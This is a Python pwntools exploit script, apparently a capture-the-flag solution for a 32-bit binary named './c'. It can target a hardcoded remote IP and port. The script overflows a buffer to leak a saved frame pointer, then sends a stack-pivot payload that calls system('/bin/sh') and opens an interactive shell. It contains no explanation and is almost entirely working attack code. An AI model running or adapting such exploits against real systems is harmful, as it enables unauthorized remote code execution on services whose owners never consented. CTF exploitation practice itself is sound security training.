#!/usr/bin/env python3
# Date: 2026-05-22 00:26:34

from kk import *

context.binary = "./c"
context.log_level = "debug"
# context.timeout = 5

elf = ELF("./c")
rop = ROP(elf)
# libc = ELF("./libc_dir/libc-2.23.so")


def go():
    if args.KK or args.REMOTE:
        return remote("39.107.114.99",32786)
    else:
        return process(elf.path)


io = go()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s = io.send
sl = io.sendline
sla = io.sendlineafter
sa = io.sendafter
slt = io.sendlinethen
st = io.sendthen
r = io.recv
rn = io.recvn
rr = io.recvregex
ru = io.recvuntil
ra = io.recvall
rl = io.recvline
rs = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia = io.interactive
ic = io.close
cr = io.can_recv


def cmd(i, prompt="Your choice :"):
    sla(prompt, str(i))


def add():
    cmd(1)


def edit():
    cmd(2)


def show():
    cmd(3)


def dele():
    cmd(4)


def pwn():
    if args.GDB:
        GDB(io, "vmmap\nb *0x80492ac\nb *0x8049299")

    # ================= 你的利用代码写这里 =================
    system = elf.symbols["system"]
    leave_ret = 0x0804858C

    payload = b"A" * 0x2F + b"b"
    io.send(payload)

    io.recvuntil(b"b")
    ebp = u32(io.recv(4))
    leak("rbp", ebp)

    addr = ebp - 0x40
    bin_sh = addr + 0xC
    leak("addr", addr)
    leak("bin_sh", bin_sh)

    payload = p32(system) + p32(0) + p32(bin_sh) + b"/bin/sh\x00"
    payload = payload.ljust(0x30, b"A") + p32(addr - 0x4 + 0x10)
    io.send(payload)
    """
    payload = p32(system) + p32(0) + p32(bin_sh) + b"/bin/sh\x00"
    payload = payload.ljust(0x2C, b"A") + p32(addr - 4)
    io.send(payload)
    """
    # ======================================================

    ia()


if __name__ == "__main__":
    pwn()
